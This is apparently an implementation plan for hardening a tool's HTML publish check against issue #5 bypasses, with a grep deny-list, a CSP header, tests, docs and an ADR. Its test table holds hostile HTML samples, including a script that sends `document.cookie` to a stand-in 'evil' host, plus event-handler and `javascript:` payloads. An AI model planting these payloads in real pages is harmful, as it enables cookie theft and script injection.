# ns-5 plan: self-contained desk HTML check and desk CSP header

## Goal

Issue [#5](https://github.com/andras-tkcs/nightshift/issues/5): `ns publish` is meant to refuse HTML that loads anything from outside the page (R-DSK-2), but four simple pages get through today: a protocol-relative `<link href=//...>`, a `<script` whose `src=` is on the next line, an `<img src="https://...">` and an inline `<script>` that calls `fetch`. After this change `ns publish` refuses every HTML file that can load or send anything off the page (scripts, loading tags, remote `src`/`href`/`url(`, event handlers, `javascript:`, meta refresh), across line breaks and in any letter case, while the handoff report and other plain pages still publish. As a second line of defence, the Caddy template sends `Content-Security-Policy: default-src 'none'; style-src 'unsafe-inline'; img-src data:` on the two HTML listeners (`:8443` and `http://127.0.0.1:8080`), so a plain `bootstrap.sh` rerun keeps the header that was added by hand on ns-main.

Inputs: `.nightshift/runs/ns-5/acceptance.md` (AC-1 to AC-8) and `.nightshift/runs/ns-5/design.md`. Their decisions are taken as made.

## Current state

- `bin/lib/desk.sh:10-16`: `ns_desk_check_html` runs one line-based `grep -Eiq` with three alternatives: `<script[^>]*[[:space:]]src[[:space:]]*=`, `<link[^>]*href[[:space:]]*=[[:space:]]*["']?http` and `@import`. Line-based, so a `src=` on a later line passes; `//` passes; `<img src=https://..>` and inline `<script>` pass.
- `bin/lib/ns-publish.sh:57-58`: the only caller. On failure: `ns_die "$name: HTML must be self-contained (no external scripts or styles)"` (exit 1, nothing copied because validation runs before any copy, `ns-publish.sh:32-65`).
- `templates/caddy/Caddyfile.tmpl:1-20`: three blocks. `@TS_HOST@` (lines 1-6, reverse proxy to SilverBullet), `@TS_HOST@:8443` (lines 8-15, `file_server browse` plus `header X-Robots-Tag "noindex"` at line 14) and `http://127.0.0.1:8080` (lines 17-20, `file_server browse`). No CSP anywhere. `bin/bootstrap.sh:90` renders it with `sed`; step 1 writes `/etc/caddy/Caddyfile` (`bin/bootstrap.sh:149-151`). `--upgrade` runs only steps 8 and 9 (`bin/bootstrap.sh:655-661`), so it never rewrites the Caddyfile.
- `tests/bats/desk.bats:60-82`: three HTML cases (external script refused, with the old message asserted at line 64; external stylesheet and `@import` refused; inline style published). Helpers used: `ns_test_setup`, `assert_success`, `assert_failure`, `assert_output_contains` (`tests/bats/helpers.bash`). Each test has a run `sbx-12` with `RUNDIR` and `DESK` set in `setup()`.
- `tests/bats/bootstrap.bats:246-255`: "the rendered Caddyfile has the desk, the HTML listener and the tunnel listener" renders the template with `sed` and greps it.
- `plugins/ns/skills/handoff-report/template.html`: the only HTML template in the repo. It has two `<meta>` tags, inline `<style>` and one `<a href="{{PR_URL}}">` (line 42). No `<script`, `src`, `url(`, event handler.
- Docs that describe the old check: `docs/spec.md:222` (R-DSK-2, one line), `docs/usage.md:171` (the `ns publish` paragraph lists `<script src>`, `<link href="http...">`, `@import`), `plugins/ns/skills/review-desk/SKILL.md:29`, `docs/architecture.html:1860-1869` (the #5 hand-fix note), `docs/setup.md:68` (what the rendered Caddyfile contains).
- Tooling on ns-main: GNU grep 3.12 at `/usr/bin/grep`, `caddy` at `/usr/bin/caddy` (`caddy adapt` of the rendered template with the header exits 0; checked while planning). `ADR` numbers in use: 0001-0009, next free is 0010.
- Planner prototype: the function in "Design / D-check" below was run against every case listed in "Design / D-tests" plus a 2.3 MB benign page (0.09 s) and the filled handoff template; all gave the expected result, and it is shellcheck clean with `--shell=bash`.

## Design

### D-check: `ns_desk_check_html` (replaces `bin/lib/desk.sh:10-16`)

Same name, same contract (0 = self-contained, 1 = refuse). The whole file is one record (`grep -z`), so `[[:space:]]` and `[^>]` match newlines (AC-2); `-i` covers letter case (AC-3). `LC_ALL=C` makes every byte a character, so invalid UTF-8 cannot break a `[^>]` run and `-i` is ASCII-only. A grep error (exit 2) refuses: the check fails closed. Write it exactly like this:

```bash
# ns_desk_check_html <file>: return 1 when the HTML is not self-contained (R-DSK-2).
# A deny-list over the whole file (grep -z, so matches span lines), case-insensitive.
# The CSP header on the desk listeners is the second layer (templates/caddy/Caddyfile.tmpl).
ns_desk_check_html() {
  local f="$1" tag remote r rc
  # a tag body: any characters but ">", or a quoted string taken whole so a quoted ">" does not end the tag
  tag='([^>]|"[^"]*"|'\''[^'\'']*'\'')*'
  # "=" then a value that leaves the page: http:, https:, //, \, /\ or an entity (&...)
  remote='[[:space:]]*=[[:space:]]*["'\'']?[[:space:]]*(https?:|//|\\|/\\|&)'
  local -a rules=(
    # any script, inline or not, any case
    '<script'
    # tags that only load things
    '<(link|base|iframe|frame|object|embed)[[:space:]/>]'
    # src= with a remote value, on any element
    '[[:space:]/"'\'']src'"$remote"
    # srcset is a list of URLs; a self-contained page uses src="data:..."
    '[[:space:]/"'\'']srcset[[:space:]]*='
    # href= (or xlink:href=) with a remote value on any tag but <a>
    '<([b-z][a-z0-9:-]*|a[a-z0-9:-]+)'"$tag"'[[:space:]/"'\''](xlink:)?href'"$remote"
    # CSS imports
    '@import'
    # CSS url() with a remote value
    'url\([[:space:]]*["'\'']?[[:space:]]*(https?:|//|\\|/\\|&)'
    # inline event handlers (on...=) inside a tag
    '<[a-z][a-z0-9:-]*'"$tag"'[[:space:]/"'\'']on[a-z]+[[:space:]]*='
    # javascript: URLs, anywhere
    'javascript:'
    # <meta http-equiv=refresh>
    'http-equiv[[:space:]]*=[[:space:]]*["'\'']?[[:space:]]*refresh'
  )
  # a NUL byte would split grep -z records and reopen the multiline bypass (also refuses UTF-16)
  [ "$(LC_ALL=C tr -cd '\000' <"$f" | wc -c)" -eq 0 ] || return 1
  for r in "${rules[@]}"; do
    rc=0
    LC_ALL=C grep -Eiqz -e "$r" -- "$f" || rc=$?
    [ "$rc" -eq 1 ] || return 1
  done
  return 0
}
```

The tag body lets `[^>]` take quote characters too, so an attribute that follows a closing quote with no space (`src="x"onerror=...`) or a stray quote in an unquoted value is still seen; the price is that an `on...=` text inside another attribute's quoted value is refused, which is accepted. Mapping to the design's rules: NUL (design rule 1), `<script` (2), loading tags (3), `src` and `srcset` (4), non-`<a>` href (5), `@import` (6), `url(` (7), event handlers (8), `javascript:` and meta refresh (9).

Planner refinements within the design (listed for gate 1, D3 below): `srcset` is refused whatever its value, because a srcset value is a comma-separated list and a remote second entry (`a.png 1x, https://x 2x`) would get past a "value starts with" test; CSS `url(` also refuses an entity-encoded value (`&`), like `src`; the tag body lets quotes through as single characters (see above); `LC_ALL=C`; fail closed on grep exit 2.

### D-message: the refusal text

`bin/lib/ns-publish.sh:58` becomes:

```bash
      ns_die "$name: HTML must be self-contained (no scripts, no external resources)"
```

### D-csp: the Caddy template

Add this exact line (4-space indent) in two places of `templates/caddy/Caddyfile.tmpl`, and nowhere else:

```
    header Content-Security-Policy "default-src 'none'; style-src 'unsafe-inline'; img-src data:"
```

1. In the `@TS_HOST@:8443` block, directly after `    header X-Robots-Tag "noindex"`.
2. In the `http://127.0.0.1:8080` block, directly after `    file_server browse`.

The `@TS_HOST@` block (lines 1-6) is not changed (AC-6).

### D-tests

`tests/bats/desk.bats`. Add these two helpers after `tok()` (line 30):

```bash
# refused <printf %b text>: publishing it as x.html fails with the R-DSK-2 message and copies nothing
refused() {
  printf '%b' "$1" >"$RUNDIR/x.html"
  run ns publish sbx-12 RUN/x.html
  assert_failure 1
  assert_output_contains "x.html: HTML must be self-contained (no scripts, no external resources)"
  [ ! -e "$DESK/runs/sbx-12/x.html" ]
}

# published <printf %b text>: publishing it as x.html succeeds and the file is on the desk
published() {
  printf '%b' "$1" >"$RUNDIR/x.html"
  run ns publish sbx-12 RUN/x.html
  assert_success
  [ -f "$DESK/runs/sbx-12/x.html" ]
}
```

Change the assertion at line 64 to the D-message text: `assert_output_contains "r.html: HTML must be self-contained (no scripts, no external resources)"`. Keep the other existing HTML cases as they are.

Add these `@test` cases after the existing "HTML with an inline style only is published" case. The test names are exact; each body is one `refused` or `published` call with the given argument (single-quoted in the test file unless the cell says otherwise):

| Test name | Body |
|---|---|
| `issue #5 bypass a: protocol-relative link href is refused` | `refused '<link rel=stylesheet href=//evil/x.css>\n'` |
| `issue #5 bypass b: script with src on the next line is refused` | `refused '<script\nsrc="https://x"></script>\n'` |
| `issue #5 bypass c: img with an https src is refused` | `refused '<img src="https://x">\n'` |
| `issue #5 bypass d: inline script is refused` | `refused '<script>fetch("https://evil/?"+document.cookie)</script>\n'` |
| `link with href on the next line is refused` | `refused '<link\nhref="https://x/a.css">\n'` |
| `uppercase SCRIPT is refused` | `refused '<SCRIPT>alert(1)</SCRIPT>\n'` |
| `single-quoted protocol-relative src is refused` | `refused "<img src='//x'>\n"` (double-quoted in the file) |
| `unquoted http src is refused` | `refused '<img src=http://x>\n'` |
| `an onerror handler is refused` | `refused '<img src="data:image/png;base64,AA==" onerror="fetch(1)">\n'` |
| `a remote CSS url() is refused` | `refused '<p style="background:url(//x)">hi</p>\n'` |
| `a quoted > does not end the tag early` | `refused '<svg><image title=">" href=//x/></svg>\n'` |
| `a handler right after a closing quote is refused` | `refused '<img src="data:image/png;base64,AA=="onerror="fetch(1)">\n'` |
| `a handler after a stray quote is refused` | `refused '<img src=data:x title=a"b onerror=fetch(1)>\n'` |
| `svg href and xlink:href are refused` | two calls: `refused '<svg><image href="https://x"/></svg>\n'` and `refused '<svg><use xlink:href="//x#a"/></svg>\n'` |
| `srcset, meta refresh and javascript: are refused` | three calls: `refused '<img srcset="a.png 1x, https://x 2x">\n'`, `refused '<meta http-equiv="refresh" content="0;url=https://x">\n'`, `refused '<a href="javascript:alert(1)">x</a>\n'` |
| `a file with a NUL byte is refused` | `refused '<p>a\0b</p>\n'` |
| `inline style, a data: image and an a href link are published` | `published '<style>p{color:red}</style><img src="data:image/png;base64,iVBORw0KGgo="><p><a href="https://github.com/o/r/pull/1">PR</a></p>\n'` |
| `prose with = and a bare URL is published` | `published '<p>one = two, see https://x and say "onclick = no"</p>\n'` |

And this case, which calls the function directly:

```bash
@test "the filled handoff template passes the check" {
  sed 's#{{PR_URL}}#https://github.com/o/r/pull/1#g' \
    "$NS_REPO_ROOT/plugins/ns/skills/handoff-report/template.html" >"$BATS_TEST_TMPDIR/h.html"
  # shellcheck source=/dev/null
  source "$NS_REPO_ROOT/bin/lib/desk.sh"
  run ns_desk_check_html "$BATS_TEST_TMPDIR/h.html"
  assert_success
}
```

`tests/bats/bootstrap.bats`, a new case directly after the one that ends at line 255:

```bash
@test "the rendered Caddyfile sends the CSP on the HTML listeners only" {
  out="$BATS_TEST_TMPDIR/Caddyfile"
  sed 's/@TS_HOST@/ns-main.example.ts.net/g' "$NS_REPO_ROOT/templates/caddy/Caddyfile.tmpl" >"$out"
  csp='    header Content-Security-Policy "default-src '\''none'\''; style-src '\''unsafe-inline'\''; img-src data:"'
  block() { awk -v h="$1" '$0 == h {f=1} f {print} f && /^}/ {exit}' "$out"; }
  [ "$(block 'ns-main.example.ts.net:8443 {' | grep -cxF "$csp")" -eq 1 ]
  [ "$(block 'http://127.0.0.1:8080 {' | grep -cxF "$csp")" -eq 1 ]
  [ "$(block 'ns-main.example.ts.net {' | grep -c 'reverse_proxy 127.0.0.1:3000')" -eq 1 ]
  [ "$(block 'ns-main.example.ts.net {' | grep -c 'Content-Security-Policy')" -eq 0 ]
  [ "$(grep -c 'Content-Security-Policy' "$out")" -eq 2 ]
  # setup() puts a caddy stub (tests/fixtures/bootstrap/bin/caddy) first on PATH; find a real one
  real=""
  while IFS= read -r c; do
    case "$c" in "$NS_REPO_ROOT"/*) ;; *) real="$c"; break ;; esac
  done < <(type -ap caddy)
  [ -n "$real" ] || skip "caddy not installed; caddy adapt not run"
  run "$real" adapt --config "$out" --adapter caddyfile
  assert_success
}
```

### D-docs: exact doc text (retirement phase)

- `docs/spec.md:222`, replace the R-DSK-2 bullet with:
  `- **R-DSK-2** HTML reports are self-contained: inline CSS, no scripts, nothing loaded from outside the page, readable on a phone. Two layers enforce it. `ns publish` refuses a page with any `<script`, a `<link>`, `<base>`, `<iframe>`, `<frame>`, `<object>` or `<embed>` tag, a `src`, CSS `url(` or non-`<a>` `href` pointing off the page (`http:`, `https:`, `//`), any `srcset`, `@import`, an inline event handler, `javascript:`, a meta refresh or a NUL byte; the check spans lines and ignores case. The desk's HTML listeners (`:8443` and `http://127.0.0.1:8080`) send `Content-Security-Policy: default-src 'none'; style-src 'unsafe-inline'; img-src data:` from `templates/caddy/Caddyfile.tmpl`. The publish check is a pattern deny-list, not an HTML parser; evasions it misses (for example a tab inside a scheme, CSS escapes, or `poster`, `data`, `action` and `formaction` attributes) are left to the CSP (ADR 0010). `<a href>` links to other sites are allowed: CSP does not govern navigation.`
- `docs/usage.md:171`, replace the sentence `HTML must be self-contained: an external `<script src>`, a `<link href="http...">` or an `@import` is refused.` with:
  `HTML must be self-contained: a page with any `<script`, a `<link>`, `<base>`, `<iframe>`, `<frame>`, `<object>` or `<embed>` tag, a `src`, `url(` or non-`<a>` `href` that points off the page (`http:`, `https:`, `//`), any `srcset`, an `@import`, an inline event handler (`onerror=` and the like), `javascript:` or a meta refresh is refused with `<name>: HTML must be self-contained (no scripts, no external resources)`, even when the tag spans several lines. Plain `<a href="https://...">` links and `data:` images are fine. The desk's HTML side also sends a Content-Security-Policy header, so a browser refuses outside scripts, styles and images even in a page that got past the check (R-DSK-2).`
- `plugins/ns/skills/review-desk/SKILL.md:29`, replace the bullet with:
  `- HTML must be self-contained: inline CSS, no scripts (inline or external), no event handlers, no `javascript:` links, nothing loaded from outside the page (no `<link>`, `<iframe>`, remote `src`, `srcset`, `url(` or `@import`), readable on a phone. Plain `<a href>` links and `data:` images are fine. Publishing refuses anything else, and the desk's CSP header blocks it in the browser too.`
- `plugins/ns/skills/handoff-report/SKILL.md:9`, after the sentence ``Escape `&`, `<` and `>` in everything you insert as text.`` insert: ``When the text names markup that `ns publish` refuses (such as `javascript:`, `@import`, `src=https:` or `url(`), also write `:` as `&#58;`, `@` as `&#64;` and `(` as `&#40;` in it, or the page is refused.``
- `docs/setup.md:68`, after `and `http://127.0.0.1:8080` for the tunnel` insert `; the two HTML listeners send a Content-Security-Policy header (R-DSK-2)`, so the sentence reads `... the HTML view on `:8443`, and `http://127.0.0.1:8080` for the tunnel; the two HTML listeners send a Content-Security-Policy header (R-DSK-2).`
- `docs/architecture.html:1861`, replace the `<p>` with:
  `<p>A Content-Security-Policy header makes the browser refuse outside scripts, styles and images on the HTML side of the desk. Not on SilverBullet (<code>:443</code>), which needs its own scripts. Since the Review 1 run for #5 the publish check is strict and <code>templates/caddy/Caddyfile.tmpl</code> carries the header; on a server installed before that, add it by hand:</p>`
- `docs/architecture.html:1869`, replace the `<p class="note">` with:
  `<p class="note"><code>bootstrap.sh --upgrade</code> leaves the Caddyfile alone. A plain rerun of <code>bootstrap.sh</code> rewrites it from the template, which carries this header since the #5 run, but not yet the ntfy block; until the ntfy run is installed, check the Caddyfile after any plain rerun.</p>`
- `CHANGELOG.md`, under `## [Unreleased]` add:

  ```
  ### Security

  - `ns publish` refuses desk HTML that can load or send anything off the page: any script, loading tags, remote `src`/`href`/`url(`, `srcset`, event handlers, `javascript:` and meta refresh, across line breaks and in any case (#5).
  - The Caddy template sends `Content-Security-Policy: default-src 'none'; style-src 'unsafe-inline'; img-src data:` on the desk's HTML listeners (`:8443`, `127.0.0.1:8080`), so a plain `bootstrap.sh` rerun keeps it (#5).
  ```

### D-adr: ADR 0010

`docs/adr/0010-desk-html-deny-list-and-csp.md`, in the format of `docs/adr/0006-guard-hook-fails-open.md` (Status, Context, Decision with "Rejected alternatives:", Consequences):

- Title: `# 0010. Desk HTML is checked by a deny-list and a CSP header`
- Status: `Accepted`
- Context: R-DSK-2; the `:8443` listener serves the whole desk on one origin with directory browsing, so a page that runs script or loads from outside can send desk contents out of the owner's browser; issue #5 showed the line-based check was easy to bypass.
- Decision: `ns publish` refuses HTML with a case-insensitive, whole-file (`grep -z`) deny-list in `ns_desk_check_html`, failing closed; the desk's HTML listeners send `default-src 'none'; style-src 'unsafe-inline'; img-src data:`. Navigation links (`<a href>`) stay allowed. Rejected alternatives: a Python `html.parser` check (better parsing, but moves a shell check into Python and still needs URL normalising; revisit if evasions show up); an allowlist of `data:`/`#` values (refuses relative paths, which nothing asks for); flattening newlines with `tr` before a line-based grep (same effect as `-z` with an extra pipe, same NUL issue); sanitising or rewriting the HTML (refusing is simpler and visible to the author).
- Consequences: the check is not a parser; the evasions named in R-DSK-2 are left to the CSP, so the header must stay in the template. Some harmless pages are refused (prose containing `javascript:`, `<link rel=canonical>`); authors escape the text (`javascript&#58;`) or drop the tag. Caddy's browse listing loses its inline-script features under the CSP, and relative images on desk pages do not load.

Add the row `| [0010](0010-desk-html-deny-list-and-csp.md) | Desk HTML is checked by a deny-list and a CSP header | Accepted |` to the table in `docs/adr/README.md`.

## ADRs

- ADR 0010: Desk HTML is checked by a case-insensitive whole-file deny-list in `ns publish` plus a CSP header on the desk's HTML listeners; rejected a Python HTML parser, an allowlist, `tr`-flattening and sanitising (it moves a trust boundary and rejects non-obvious alternatives, `docs/adr/README.md`). Written in p3.

## Manual steps

None. The CSP header is already on ns-main by hand (`docs/build-plan.md:44`); this change only puts it in the template. The real `caddy adapt` runs in the bats case on ns-main (the case looks past the fixture stub) and in p2's acceptance, so no human check is needed. No `RUN/manual-steps.md` is written.

## Risks and open questions

### Decisions for gate 1 (defaults taken; the plan proceeds with them unless the owner says otherwise)

- **D1. Refuse every absolute `href`, `<a>` included?** Default taken: **no**. `<a href="https://...">` navigation links stay allowed; only resource-loading hrefs are refused (loading tags outright, remote `href` on any tag but `<a>`). Reason: the handoff template links to the PR on purpose (`template.html:42`) and CSP does not govern navigation. If the owner says yes, p1's rule for href drops the `<a>` exception, the "published" case with an `<a href>` flips, and the handoff template and `handoff-report/SKILL.md` must show the PR URL as text; that is a re-plan of p1 and p3.
- **D2. Extend the CSP with `base-uri 'none'; form-action 'none'; frame-ancestors 'none'`?** Default taken: **no**, the header is exactly the AC-6 string. `<base>` is refused by the publish check; `form-action` and `frame-ancestors` are not covered by `default-src`, so a form posting off the page is caught by neither layer today (a form needs a user click). If the owner says yes, AC-6's string changes and p2's line and test change accordingly; nothing else does.
- **D3. Planner refinements within the design** (no new behaviour beyond the design's goal; listed so the owner sees them): `srcset` is refused whatever its value (its value is a URL list, so a "starts with" test is bypassable); CSS `url(` also refuses an entity-encoded value; the tag body lets quotes through as single characters, so `<img src="x"onerror=...>` is caught at the price of refusing an `on...=` text inside another attribute's quoted value; the check runs with `LC_ALL=C`; a grep error refuses the file (fail closed).

### Risks for workers

- **ADR number collision.** ns-8 may run at the same time and could also take 0010. p3's worker checks `ls docs/adr/0010-*` on its branch first; if a different 0010 exists, stop with `status=blocked` naming the file.
- **Brief vs. code drift.** p1's brief replaces `bin/lib/desk.sh` lines 10-16 and `ns-publish.sh:58`. If those lines do not hold the old `ns_desk_check_html` and the old message, stop with `status=blocked`.
- **AC-1 negative check.** The "fails against `origin/main`" step overwrites `bin/lib/desk.sh` temporarily; it must run only after p1's work is committed, and must end with `git checkout HEAD -- bin/lib/desk.sh` and a clean `git status --porcelain`.
- **False positives on existing pages.** The only HTML template is the handoff template, covered by a test. Desk pages published before this change are not rechecked.
- **Caddy not installed on a CI runner.** The bootstrap case skips the `caddy adapt` part there; on ns-main caddy is at `/usr/bin/caddy` and it runs.
- **A pre-existing environment leak in the bats suite.** A Nightshift session on ns-main exports `NS_NTFY_URL`, `NS_CMD` and `NS_PROJECT`, which `ns_test_setup` (`tests/bats/helpers.bash:18-19`) does not unset. On a clean checkout of this branch, plain `bats tests/bats` then fails 4 cases ("publishing at a gate notifies with the desk URL", "ns_die and ns_usage format and exit codes", "ns_require dies on a missing command", "merge makes a --no-ff merge with the trailer, ..."); with the three variables unset they pass (checked while planning; the other 315 pass either way). It is not this run's bug, `helpers.bash` is not in any phase's `touches`, and CI is not affected. Run every bats command in this plan as `env -u NS_NTFY_URL -u NS_CMD -u NS_PROJECT bats ...`. If a case outside desk.bats and bootstrap.bats fails with those unset, stop with `status=blocked`.
- **This run's own handoff page.** The check also matches `javascript:`, `@import`, a remote `src=` and `url(` in escaped prose, and ns-5's gate-2 `RUN/handoff.html` will describe exactly these bypasses. p3 adds a sentence to `plugins/ns/skills/handoff-report/SKILL.md` telling the filler to write `:` as `&#58;`, `@` as `&#64;` and `(` as `&#40;` in such text (D-docs). If a handoff publish is still refused, the filler escapes the matched text; it never weakens the check.
- **Grep is GNU grep in scripts.** An interactive shell may wrap `grep` in a function (ugrep); scripts and bats use `/usr/bin/grep`. If a worker sees `-z` treated as decompression, it is running the wrapper; use `command grep`.

## Implementation manifest

```yaml
plan_slug: ns-5
feature_branch: feature/ns-5
max_parallel: 2
manual_before: []
manual_after: []
verify_after_merge:
  - "tests/lint"
  - "env -u NS_NTFY_URL -u NS_CMD -u NS_PROJECT bats tests/bats/desk.bats tests/bats/bootstrap.bats"
final_checks:
  - "docs/ns-5-plan.md is deleted"
  - "docs/adr/0010-desk-html-deny-list-and-csp.md exists and docs/adr/README.md lists it"
  - "CHANGELOG.md has a ### Security entry under [Unreleased] naming #5"
  - "tests/lint, env -u NS_NTFY_URL -u NS_CMD -u NS_PROJECT bats tests/bats and tests/docs-check --final exit 0"
phases:
  - id: p1-publish-check
    title: Rewrite the desk HTML check (multiline, scripts, remote URLs) with bats cases
    depends_on: []
    complexity: S
    touches:
      - bin/lib/desk.sh
      - bin/lib/ns-publish.sh
      - tests/bats/desk.bats
    brief: |
      Read docs/ns-5-plan.md sections "Current state", "Design / D-check", "Design / D-message" and "Design / D-tests" first. Everything you need is spelled out there.
      1. Check that bin/lib/desk.sh lines 10-16 hold the old ns_desk_check_html (a single grep -Eiq with '<script[^>]*[[:space:]]src' ...) and that bin/lib/ns-publish.sh line 58 holds "(no external scripts or styles)". If not, stop with status=blocked and say what you found.
      2. In tests/bats/desk.bats, add the refused() and published() helpers after tok(), change the assertion at line 64 to the D-message text, and add every @test from the D-tests table plus "the filled handoff template passes the check", with the exact names given, after the case "HTML with an inline style only is published". Run `env -u NS_NTFY_URL -u NS_CMD -u NS_PROJECT bats tests/bats/desk.bats`: the new refusal cases and the line-64 case fail at this point (the code is still old). That is expected.
      3. Replace ns_desk_check_html in bin/lib/desk.sh (comment line and function, lines 10-16) with the D-check function, character for character. Do not change ns_desk_run_dir or ns_desk_index.
      4. In bin/lib/ns-publish.sh line 58, replace the message with the D-message line. Change nothing else in that file.
      5. Run `env -u NS_NTFY_URL -u NS_CMD -u NS_PROJECT bats tests/bats/desk.bats` and `tests/lint`; both must pass. If a published/refused case fails with the D-check function copied exactly, do not edit the patterns to make it pass: stop with status=blocked and quote the case and the output.
      6. Commit (message "ns-5 p1: multiline desk HTML check with script and remote-URL rules").
      7. AC-1 negative check, after the commit: run `git show origin/main:bin/lib/desk.sh > bin/lib/desk.sh`, then `env -u NS_NTFY_URL -u NS_CMD -u NS_PROJECT bats -f 'issue #5 bypass' tests/bats/desk.bats` and confirm all four "issue #5 bypass" cases fail, then `git checkout HEAD -- bin/lib/desk.sh` and confirm `git status --porcelain` prints nothing. Put the four "not ok" lines in your hand-back note.
      Do not touch docs, CHANGELOG.md or the Caddy template; later phases do that.
    acceptance:
      - "env -u NS_NTFY_URL -u NS_CMD -u NS_PROJECT bats tests/bats/desk.bats exits 0"
      - "tests/lint exits 0"
      - "grep -c '@test \"issue #5 bypass' tests/bats/desk.bats prints 4"
      - "grep -n 'grep -Eiqz' bin/lib/desk.sh finds one line and grep -n 'LC_ALL=C tr -cd' bin/lib/desk.sh finds one line"
      - "grep -c 'no scripts, no external resources' bin/lib/ns-publish.sh prints 1 and grep -c 'no external scripts or styles' bin/lib/ns-publish.sh tests/bats/desk.bats prints 0 for each file"
      - "with origin/main's bin/lib/desk.sh in place, env -u NS_NTFY_URL -u NS_CMD -u NS_PROJECT bats -f 'issue #5 bypass' tests/bats/desk.bats reports 4 failures (step 7); afterwards git status --porcelain is empty"
  - id: p2-caddy-csp
    title: Send the CSP header on the desk's HTML listeners in the Caddy template
    depends_on: []
    complexity: S
    touches:
      - templates/caddy/Caddyfile.tmpl
      - tests/bats/bootstrap.bats
    brief: |
      Read docs/ns-5-plan.md sections "Current state", "Design / D-csp" and the bootstrap.bats part of "Design / D-tests" first.
      1. Check that templates/caddy/Caddyfile.tmpl has three blocks (@TS_HOST@, @TS_HOST@:8443 with `header X-Robots-Tag "noindex"`, http://127.0.0.1:8080) and no Content-Security-Policy line. If not, stop with status=blocked.
      2. In tests/bats/bootstrap.bats, add the @test "the rendered Caddyfile sends the CSP on the HTML listeners only" exactly as in D-tests, directly after the case "the rendered Caddyfile has the desk, the HTML listener and the tunnel listener". Run `env -u NS_NTFY_URL -u NS_CMD -u NS_PROJECT bats -f 'sends the CSP' tests/bats/bootstrap.bats`: it fails now. That is expected.
      3. In templates/caddy/Caddyfile.tmpl, add the D-csp line (4-space indent, exact text) after `    header X-Robots-Tag "noindex"` in the @TS_HOST@:8443 block and after `    file_server browse` in the http://127.0.0.1:8080 block. Do not touch the @TS_HOST@ block. Keep 4-space indentation as in the rest of the file.
      4. Run `env -u NS_NTFY_URL -u NS_CMD -u NS_PROJECT bats tests/bats/bootstrap.bats` and `tests/lint`; both must pass. On ns-main /usr/bin/caddy is installed, so the new case must report ok, not skip; if it skips, run `type -ap caddy` and report the output. If `caddy adapt` fails, stop with status=blocked and quote its output; do not change the header text.
      5. Commit (message "ns-5 p2: CSP header on the desk's HTML listeners").
      Do not touch docs or CHANGELOG.md; p3 does that.
    acceptance:
      - "env -u NS_NTFY_URL -u NS_CMD -u NS_PROJECT bats tests/bats/bootstrap.bats exits 0, and the case 'the rendered Caddyfile sends the CSP on the HTML listeners only' is reported ok (not skipped) on ns-main"
      - "grep -c \"header Content-Security-Policy \\\"default-src 'none'; style-src 'unsafe-inline'; img-src data:\\\"\" templates/caddy/Caddyfile.tmpl prints 2"
      - "sed -n 1,6p templates/caddy/Caddyfile.tmpl is unchanged against origin/main (git diff origin/main -- templates/caddy/Caddyfile.tmpl shows only two added lines)"
      - "sed 's/@TS_HOST@/h.example/g' templates/caddy/Caddyfile.tmpl > /tmp/ns5-Caddyfile && caddy adapt --config /tmp/ns5-Caddyfile --adapter caddyfile exits 0"
      - "tests/lint exits 0"
  - id: p3-retire
    title: Docs, ADR 0010, changelog; retire the plan
    depends_on: [p1-publish-check, p2-caddy-csp]
    complexity: S
    touches:
      - docs/spec.md
      - docs/usage.md
      - docs/setup.md
      - docs/architecture.html
      - plugins/ns/skills/review-desk/SKILL.md
      - plugins/ns/skills/handoff-report/SKILL.md
      - docs/adr/0010-desk-html-deny-list-and-csp.md
      - docs/adr/README.md
      - CHANGELOG.md
      - docs/ns-5-plan.md
    brief: |
      Read docs/ns-5-plan.md sections "Design / D-docs" and "Design / D-adr" first; they hold every text you write. Copy those texts before step 6 deletes the plan.
      1. Run `ls docs/adr/0010-* 2>/dev/null`. If a file other than docs/adr/0010-desk-html-deny-list-and-csp.md exists, stop with status=blocked and name it.
      2. Apply each D-docs replacement: docs/spec.md line 222 (R-DSK-2), docs/usage.md line 171 (the one sentence only), plugins/ns/skills/review-desk/SKILL.md line 29, plugins/ns/skills/handoff-report/SKILL.md line 9, docs/setup.md line 68, docs/architecture.html lines 1861 and 1869. Locate each by its current text, not only its line number; if a quoted current text is not found, stop with status=blocked and name the file.
      3. Write docs/adr/0010-desk-html-deny-list-and-csp.md from D-adr, in the section layout of docs/adr/0006-guard-hook-fails-open.md (headings "## Status", "## Context", "## Decision", "## Consequences"; rejected alternatives as a list under Decision). Add the D-adr row to the table in docs/adr/README.md after the 0009 row.
      4. Add the D-docs CHANGELOG.md block under "## [Unreleased]" (a "### Security" heading and the two bullets).
      5. Run `tests/docs-check`, `tests/docs-check --final`, `tests/lint` and `env -u NS_NTFY_URL -u NS_CMD -u NS_PROJECT bats tests/bats`; all must exit 0.
      6. Delete docs/ns-5-plan.md (`git rm docs/ns-5-plan.md`), rerun `tests/docs-check`, and commit (message "ns-5 p3: R-DSK-2 docs, ADR 0010, changelog; retire the plan").
    acceptance:
      - "grep -n 'Content-Security-Policy' docs/spec.md finds the R-DSK-2 line"
      - "grep -c 'no scripts, no external resources' docs/usage.md prints 1 and grep -c '<link href=\"http...\">' docs/usage.md prints 0"
      - "grep -c 'Content-Security-Policy' docs/setup.md prints at least 1"
      - "test -f docs/adr/0010-desk-html-deny-list-and-csp.md and grep -c '0010-desk-html-deny-list-and-csp.md' docs/adr/README.md prints 1"
      - "grep -n '### Security' CHANGELOG.md finds a line between '## [Unreleased]' and '## [0.1.0]'"
      - "test ! -e docs/ns-5-plan.md"
      - "tests/docs-check --final, tests/lint and env -u NS_NTFY_URL -u NS_CMD -u NS_PROJECT bats tests/bats exit 0"
```
